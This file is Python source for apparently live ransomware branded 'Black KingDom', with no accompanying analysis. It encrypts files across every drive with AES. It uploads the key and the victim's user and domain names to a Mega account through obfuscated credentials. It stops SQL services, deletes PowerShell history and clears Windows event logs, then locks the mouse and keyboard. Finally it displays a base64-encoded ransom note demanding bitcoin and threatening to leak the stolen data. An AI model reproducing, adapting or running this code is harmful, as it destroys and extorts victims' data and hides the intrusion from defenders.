import os, sys, string, random, hashlib, time, PySimpleGUI as sg
from getpass import getuser
from socket import getfqdn
from pyHook import HookManager
from pathlib import Path
from requests import post
from Crypto import Random
from Crypto.Cipher import AES
from base64 import b64decode
from mega import Mega
from winsys.event_logs import EventLog
from concurrent.futures import ThreadPoolExecutor
changenameafterencodeingthemessage = list()
changenameafterencodeingthemessageformessagepath = list()

def PleasStopMe(event):
    return False


def disable_Mou_And_Key():
    try:
        HOxOxO0 = HookManager()
        HOxOxO0.MouseAll = PleasStopMe
        HOxOxO0.KeyAll = PleasStopMe
        HOxOxO0.HookMouse()
        HOxOxO0.HookKeyboard()
    except Exception:
        pass


def gen_string(size=64, wtf=string.ascii_uppercase + string.digits):
    return ''.join((random.choice(wtf) for _ in range(size)))


ifstoping = False
key = hashlib.md5(gen_string().encode('utf-8')).hexdigest().encode('utf-8')
gen_id = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(random.randint(20, 20))])
VUVvckNfPpBoVOwGkSTCBOvKNodpUgNVuDbFMgYKVYwxEyQeofdlvCyFGjWiUvGNOKEiqDNdcVwjlPgiERORAVjRLSxARKhnmbyURxiOlgzFCCiZAqAQZonGAdkuxpRS = 'KioqKioqKioqKioqKioqKioqKioqKioqKioqCnwgd2hhdCBoYXBwZW5lZCAgICAgICAgICAgPwoqKioqKioqKioqKioqKioqKioqKioqKioqKioKCldlIGhhY2tlZCB5b3VyICgoIE5ldHdvcmsgKSksIGFuZCBub3cgYWxsIGZpbGVzLCBkb2N1bWVudHMsIGltYWdlcywKZGF0YWJhc2VzIGFuZCBvdGhlciBpbXBvcnRhbnQgZGF0YSBhcmUgc2FmZWx5IGVuY3J5cHRlZCB1c2luZyB0aGUgc3Ryb25nZXN0IGFsZ29yaXRobXMgZXZlci4KWW91IGNhbm5vdCBhY2Nlc3MgYW55IG9mIHlvdXIgZmlsZXMgb3Igc2VydmljZXMgLgpCdXQgZG8gbm90IHdvcnJ5LiBZb3UgY2FuIHJlc3RvcmUgZXZlcnRoaW5nIGFuZCBnZXQgYmFjayBidXNpbmVzcyB2ZXJ5IHNvb24gKCBkZXBlbmRzIG9uIHlvdXIgYWN0aW9ucyApCgpiZWZvcmUgSSB0ZWxsIGhvdyB5b3UgY2FuIHJlc3RvcmUgeW91ciBkYXRhLCB5b3UgaGF2ZSB0byBrbm93IGNlcnRhaW4gdGhpbmdzIDoKCldlIGhhdmUgZG93bmxvYWRlZCBtb3N0IG9mIHlvdXIgZGF0YSAoIGVzcGVjaWFsbHkgaW1wb3J0YW50IGRhdGEgKSAsIGFuZCBpZiB5b3UgZG9uJ3QgIGNvbnRhY3QgdXMgd2l0aGluIDIgZGF5cywgeW91ciBkYXRhIHdpbGwgYmUgcmVsZWFzZWQgdG8gdGhlIHB1YmxpYy4KClRvIHNlZSB3aGF0IGhhcHBlbnMgdG8gdGhvc2Ugd2hvIGRpZG4ndCBjb250YWN0IHVzLCBqdXN0IGdvb2dsZSA6ICggIEJsYWNra2luZ2RvbSBSYW5zb213YXJlICApCgoKKioqKioqKioqKioqKioqKioqKioqKioqKioqCnwgV2hhdCAgZ3VhcmFudGVlcyAgICAgICAgPwoqKioqKioqKioqKioqKioqKioqKioqKioqKioKCldlIHVuZGVyc3RhbmQgeW91ciBzdHJlc3MgYW5kIGFueGlldHkuIFNvIHlvdSBoYXZlIGEgZnJlZSBvcHBvcnR1bml0eSB0byB0ZXN0IG91ciBzZXJ2aWNlIGJ5IGluc3RhbnRseSBkZWNyeXB0aW5nIG9uZSBvciB0d28gZmlsZXMgZm9yIGZyZWUKanVzdCBzZW5kIHRoZSBmaWxlcyB5b3Ugd2FudCB0byBkZWNyeXB0IHRvICg'
len(VUVvckNfPpBoVOwGkSTCBOvKNodpUgNVuDbFMgYKVYwxEyQeofdlvCyFGjWiUvGNOKEiqDNdcVwjlPgiERORAVjRLSxARKhnmbyURxiOlgzFCCiZAqAQZonGAdkuxpRS) + 512.0
M416 = b64decode(b'KioqKioqKioqKioqKioqKioqKioqKioqKioqCnwgV2UgQXJlIEJhY2sgICAgICAgICAgICA/CioqKioqKioqKioqKioqKioqKioqKioqKioqKgoKV2UgaGFja2VkIHlvdXIgKCggTmV0d29yayApKSwgYW5kIG5vdyBhbGwgZmlsZXMsIGRvY3VtZW50cywgaW1hZ2VzLApkYXRhYmFzZXMgYW5kIG90aGVyIGltcG9ydGFudCBkYXRhIGFyZSBzYWZlbHkgZW5jcnlwdGVkIHVzaW5nIHRoZSBzdHJvbmdlc3QgYWxnb3JpdGhtcyBldmVyLgpZb3UgY2Fubm90IGFjY2VzcyBhbnkgb2YgeW91ciBmaWxlcyBvciBzZXJ2aWNlcyAuCkJ1dCBkbyBub3Qgd29ycnkuIFlvdSBjYW4gcmVzdG9yZSBldmVydGhpbmcgYW5kIGdldCBiYWNrIGJ1c2luZXNzIHZlcnkgc29vbiAoIGRlcGVuZHMgb24geW91ciBhY3Rpb25zICkKCmJlZm9yZSBJIHRlbGwgaG93IHlvdSBjYW4gcmVzdG9yZSB5b3VyIGRhdGEsIHlvdSBoYXZlIHRvIGtub3cgY2VydGFpbiB0aGluZ3MgOgoKV2UgaGF2ZSBkb3dubG9hZGVkIG1vc3Qgb2YgeW91ciBkYXRhICggZXNwZWNpYWxseSBpbXBvcnRhbnQgZGF0YSApICwgYW5kIGlmIHlvdSBkb24ndCAgY29udGFjdCB1cyB3aXRoaW4gMiBkYXlzLCB5b3VyIGRhdGEgd2lsbCBiZSByZWxlYXNlZCB0byB0aGUgcHVibGljLgoKVG8gc2VlIHdoYXQgaGFwcGVucyB0byB0aG9zZSB3aG8gZGlkbid0IGNvbnRhY3QgdXMsIGp1c3QgZ29vZ2xlIDogKCAgQmxhY2traW5nZG9tIFJhbnNvbXdhcmUgICkKCioqKioqKioqKioqKioqKioqKioqKioqKioqKgp8IFdoYXQgIGd1YXJhbnRlZXMgICAgICAgID8KKioqKioqKioqKioqKioqKioqKioqKioqKioqCgpXZSB1bmRlcnN0YW5kIHlvdXIgc3RyZXNzIGFuZCBhbnhpZXR5LiBTbyB5b3UgaGF2ZSBhIGZyZWUgb3Bwb3J0dW5pdHkgdG8gdGVzdCBvdXIgc2VydmljZSBieSBpbnN0YW50bHkgZGVjcnlwdGluZyBvbmUgb3IgdHdvIGZpbGVzIGZvciBmcmVlCmp1c3Qgc2VuZCB0aGUgZmlsZXMgeW91IHdhbnQgdG8gZGVjcnlwdCB0byAoc3VwcG9ydF9ibGFja2tpbmdkb20yQHByb3Rvbm1haWwuY29tCgoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioKfCBIb3cgdG8gY29udGFjdCB1cyBhbmQgcmVjb3ZlciBhbGwgb2YgeW91ciBmaWxlcyAgPwoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioKClRoZSBvbmx5IHdheSB0byByZWNvdmVyIHlvdXIgZmlsZXMgYW5kIHByb3RlY3QgZnJvbSBkYXRhIGxlYWtzLCBpcyB0byBwdXJjaGFzZSBhIHVuaXF1ZSBwcml2YXRlIGtleSBmb3IgeW91IHRoYXQgd2Ugb25seSBwb3NzZXMgLgoKClsgKyBdIEluc3RydWN0aW9uczoKCjEtIFNlbmQgdGhlIGRlY3J5cHRfZmlsZS50eHQgZmlsZSB0byB0aGUgZm9sbG93aW5nIGVtYWlsID09PT4gc3VwcG9ydF9ibGFja2tpbmdkb20yQHByb3Rvbm1haWwuY29tCgoyLSBzZW5kIHRoZSBmb2xsb3dpbmcgYW1vdW50IG9mIFVTIGRvbGxhcnMgKCAxMCwwMDAgKSB3b3J0aCBvZiBiaXRjb2luIHRvIHRoaXMgYWRkcmVzcyA6CgpbIDFMZjhaemNFaGhSaVhwazZZTlFGcENKY1Vpc2lYYjM0RlQgXQoKMy0gY29uZmlybSB5b3VyIHBheW1lbnQgYnkgc2VuZGluZyB0aGUgdHJhbnNmZXIgdXJsIHRvIG91ciBlbWFpbCBhZGRyZXNzCgo0LSBBZnRlciB5b3Ugc3VibWl0IHRoZSBwYXltZW50LCB0aGUgZGF0YSB3aWxsIGJlIHJlbW92ZWQgZnJvbSBvdXIgc2VydmVycywgYW5kIHRoZSBkZWNvZGVyIHdpbGwgYmUgZ2l2ZW4gdG8geW91LApzbyB0aGF0IHlvdSBjYW4gcmVjb3ZlciBhbGwgeW91ciBmaWxlcy4KCiMjIE5vdGUgIyMKCkRlYXIgc3lzdGVtIGFkbWluaXN0cmF0b3JzLCBkbyBub3QgdGhpbmsgeW91IGNhbiBoYW5kbGUgaXQgb24geW91ciBvd24uIE5vdGlmeSB5b3VyIHN1cGVydmlzb3JzIGFzIHNvb24gYXMgcG9zc2libGUuCkJ5IGhpZGluZyB0aGUgdHJ1dGggYW5kIG5vdCBjb21tdW5pY2F0aW5nIHdpdGggdXMsIHdoYXQgaGFwcGVuZWQgd2lsbCBiZSBwdWJsaXNoZWQgb24gc29jaWFsIG1lZGlhIGFuZCB5ZXQgaW4gbmV3cyB3ZWJzaXRlcy4KCllvdXIgSUQgPT0+Cg==')
M416 = M416.decode()
BLACLIST = ['C:\\ProgramData', 'C:\\Windows', 'C:\\Program Files (x86)', 'C:\\Program Files', '\\AppData\\Roaming\\', '\\AppData\\LocalLow\\', '\\AppData\\Local\\']

def sendKey(where_my_key):
    m2 = b64decode(b'aGV3b3kxMzYwOEBoZXJvdWxvLmNvbQ==').decode()
    m = Mega().login(m2, m2)
    try:
        m.upload(data=f"Time: {time.ctime()}\nID : {gen_id}\nKEY: {where_my_key.decode()}\nUSER: {getuser()}\nDOMAIN: {getfqdn()}", dest_filename=f"{gen_id}_{getfqdn()}.TxT")
        return True
    except:
        return False


def chackkey():
    global key
    try:
        post('http://mega.io')
        if sendKey(key) == False:
            key = b64decode(b'ZWViZjE0M2NmNjE1ZWNiZTJlZGUwMTUyN2Y4MTc4YjM=').decode().encode('utf-8')
    except:
        key = b64decode(b'ZWViZjE0M2NmNjE1ZWNiZTJlZGUwMTUyN2Y4MTc4YjM=').decode().encode('utf-8')


def encrypt_file(args):

    def encrypt(MAS_SAG, key, key_size=256):

        def pad(s):
            return s + b'\x00' * (AES.block_size - len(s) % AES.block_size)

        MAS_SAG = pad(MAS_SAG)
        iv = Random.new().read(AES.block_size)
        CIP = AES.new(key, AES.MODE_CBC, iv)
        return iv + CIP.encrypt(MAS_SAG)

    FILE_UN, key = args
    try:
        with open(FILE_UN, 'rb') as (foo):
            plaintext = foo.read()
        enc = encrypt(plaintext, key)
        with open(FILE_UN, 'wb') as (foo):
            foo.write(enc)
        return FILE_UN
    except Exception:
        return args[0]


def changeName(file, name):
    try:
        os.rename(file, file + '.' + name)
    except Exception:
        pass


def writeMessagePath(path, message):
    try:
        with open(path, 'a') as (f):
            f.write(message)
    except:
        pass


def stopSqlServer():
    try:
        os.system('powershell Get-Service *sql*|Stop-Service -Force 2>$null')
        os.system('powershell rm (Get-PSReadlineOption).HistorySavePath')
    except Exception:
        pass


def get_target():

    def get_file_to_list(file):
        try:
            f = open(file).read().split('\n')
            if f[(-1)] == '':
                del f[-1]
            return f
        except Exception:
            return []

    try:
        t = [f"{i}:\\" for i in string.ascii_uppercase]
        if os.path.isfile('./target.txt'):
            Target = get_file_to_list('./target.txt')
            Target = Target or t
        else:
            Target = t
    except Exception:
        Target = t

    return Target


def start_encrypt(p, key):
    global BLACLIST
    global changenameafterencodeingthemessage
    global changenameafterencodeingthemessageformessagepath
    global ifstoping
    _mega = False
    start = time.time()
    WOWBICH = False
    with ThreadPoolExecutor(max_workers=10) as (Theerd):
        for x in p:
            target = x
            try:
                for path, _, files in os.walk(target):
                    for _BLACKLIST_ in BLACLIST:
                        if _BLACKLIST_ in path:
                            WOWBICH = True
                            break

                    if WOWBICH:
                        WOWBICH = False
                        continue
                    for name in files[::-1]:
                        try:
                            if 'decrypt_file.TxT' in os.listdir(path):
                                break
                        except Exception:
                            pass

                        if ifstoping == False:
                            if 1200 == int(time.time() - start):
                                disable_Mou_And_Key()
                                ifstoping = True
                        try:
                            changenameafterencodeingthemessage.append([Theerd.submit(encrypt_file, [os.path.join(path, name), key]).result(), ''.join([random.choice(string.ascii_letters + string.digits) for n in range(random.randint(4, 7))])])
                        except Exception:
                            continue

                    changenameafterencodeingthemessageformessagepath.append(path + '/decrypt_file.TxT')

            except Exception:
                continue

    list(map(lambda WOW: changeName(WOW[0], WOW[1]), changenameafterencodeingthemessage))
    list(map(lambda MES: writeMessagePath(path=MES, message=(M416 + gen_id)), changenameafterencodeingthemessageformessagepath))


def clear_logs_plz():
    try:
        for i in ('Application', 'Security', 'System'):
            EventLog(name=i, computer='.').clear()

    except:
        pass


def FUCKING_WINDOW():
    global ifstoping
    if ifstoping == False:
        disable_Mou_And_Key()
        ifstoping = True
    try:
        sg.theme_text_color = 'red'
        Message = M416 + gen_id
        sg.theme('black')
        layout = [[sg.Text('Black KingDom\nRansmWere', key='LOL', text_color='black', background_color='black', size=(35,
                                                                                                   2), font=('Fixedsys',
                                                                                                             20), tooltip=True), sg.T(Message, text_color='red', font=('Fixedsys', 11), background_color='black')],
         [
          sg.Text(size=(35, 2), text_color='red', background_color='black', font=('Fixedsys',
                                                                        40), key='-OUTPUT-')]]
        window = sg.Window('Stopwatch Timer', layout, resizable=True, keep_on_top=True, no_titlebar=True, background_color='black').Finalize()
        window.Maximize()
        timer_running, counter, try_mess = (True, 0, 0)

        def timers(_try_mess_):
            if _try_mess_ == 5:
                window['LOL'].update('')
                _try_mess_ = 0
            else:
                window['LOL'].update('\tBlack KingDom\n\t RansmWere', visible=(random.randint(0, 1)), text_color=(['green', 'red'][random.randint(0, 1)]))
            return _try_mess_

        while True:
            try:
                _, _ = window.read(timeout=10)
                if counter == -1:
                    time_outs = '\nTime expired: \tTHE AMOUNT DOUBLED'
                    window['-OUTPUT-'].update(time_outs)
                    try_mess += 1
                    try_mess = timers(try_mess)
                else:
                    if timer_running:
                        time_outs = '\nTime Out: \t\t{:02d}:{:02d}.{:02d}'.format(counter // 100 // 60, counter // 100 % 60, counter % 100)
                        window['-OUTPUT-'].update(time_outs)
                        counter += 1
                        try_mess += 1
                        try_mess = timers(try_mess)
                    else:
                        if '48:0' in time_outs:
                            counter = -1
            except Exception as e:
                try:
                    print(e)
                    break
                finally:
                    e = None
                    del e

        window.close()
    except Exception:
        pass


def for_fortnet():
    stopSqlServer()
    VUVvckNfPpBoVOwGkSTCBOvKNodpUgNVuDbFMgYKVYwxEyQeofdlvCyFGjWiUvGNOKEiqDNdcVwjlPgiERORAVjRLSx3RKhnmbyURxiOlgzFCCiZAqAQZonGAdkuxpRS = 'KioqKioqKioqKioqKioqKioqKioqKioqKioqCnwgd2hhdCBoYXBwZW5lZCAgICAgICAgICAgPwoqKioqKioqKioqKioqKioqKioqKioqKioqKioKCldlIGhhY2tlZCB5b3VyICgoIE5ldHdvcmsgKSksIGFuZCBub3cgYWxsIGZpbGVzLCBkb2N1bWVudHMsIGltYWdlcywKZGF0YWJhc2VzIGFuZCBvdGhlciBpbXBvcnRhbnQgZGF0YSBhcmUgc2FmZWx5IGVuY3J5cHRlZCB1c2luZyB0aGUgc3Ryb25nZXN0IGFsZ29yaXRobXMgZXZlci4KWW91IGNhbm5vdCBhY2Nlc3MgYW55IG9mIHlvdXIgZmlsZXMgb3Igc2VydmljZXMgLgpCdXQgZG8gbm90IHdvcnJ5LiBZb3UgY2FuIHJlc3RvcmUgZXZlcnRoaW5nIGFuZCBnZXQgYmFjayBidXNpbmVzcyB2ZXJ5IHNvb24gKCBkZXBlbmRzIG9uIHlvdXIgYWN0aW9ucyApCgpiZWZvcmUgSSB0ZWxsIGhvdyB5b3UgY2FuIHJlc3RvcmUgeW91ciBkYXRhLCB5b3UgaGF2ZSB0byBrbm93IGNlcnRhaW4gdGhpbmdzIDoKCldlIGhhdmUgZG93bmxvYWRlZCBtb3N0IG9mIHlvdXIgZGF0YSAoIGVzcGVjaWFsbHkgaW1wb3J0YW50IGRhdGEgKSAsIGFuZCBpZiB5b3UgZG9uJ3QgIGNvbnRhY3QgdXMgd2l0aGluIDIgZGF5cywgeW91ciBkYXRhIHdpbGwgYmUgcmVsZWFzZWQgdG8gdGhlIHB1YmxpYy4KClRvIHNlZSB3aGF0IGhhcHBlbnMgdG8gdGhvc2Ugd2hvIGRpZG4ndCBjb250YWN0IHVzLCBqdXN0IGdvb2dsZSA6ICggIEJsYWNra2luZ2RvbSBSYW5zb213YXJlICApCgoKKioqKioqKioqKioqKioqKioqKioqKioqKioqCnwgV2hhdCAgZ3VhcmFudGVlcyAgICAgICAgPwoqKioqKioqKioqKioqKioqKioqKioqKioqKioKCldlIHVuZGVyc3RhbmQgeW91ciBzdHJlc3MgYW5kIGFueGlldHkuIFNvIHlvdSBoYXZlIGEgZnJlZSBvcHBvcnR1bml0eSB0byB0ZXN0IG91ciBzZXJ2aWNlIGJ5IGluc3RhbnRseSBkZWNyeXB0aW5nIG9uZSBvciB0d28gZmlsZXMgZm9yIGZyZWUKanVzdCBzZW5kIHRoZSBmaWxlcyB5b3Ugd2FudCB0byBkZWNyeXB0IHRvICg'
    len(VUVvckNfPpBoVOwGkSTCBOvKNodpUgNVuDbFMgYKVYwxEyQeofdlvCyFGjWiUvGNOKEiqDNdcVwjlPgiERORAVjRLSx3RKhnmbyURxiOlgzFCCiZAqAQZonGAdkuxpRS)
    start_encrypt(get_target(), key)
    clear_logs_plz()
    FUCKING_WINDOW()


try:
    try:
        time.sleep(sys.argv[1])
    except:
        pass

    chackkey()
    for_fortnet()
except Exception:
    pass

# global VUVvckNfPpBoVOwGkSTCBOvKNodpUgNVuDbFMgYKVYwxEyQeofdlvCyFGjWiUvGNOKEiqDNdcVwjlPgiERORAVjRLSxARKhnmbyURxiOlgzFCCiZAqAQZonGAdkuxpRS ## Warning: Unused global
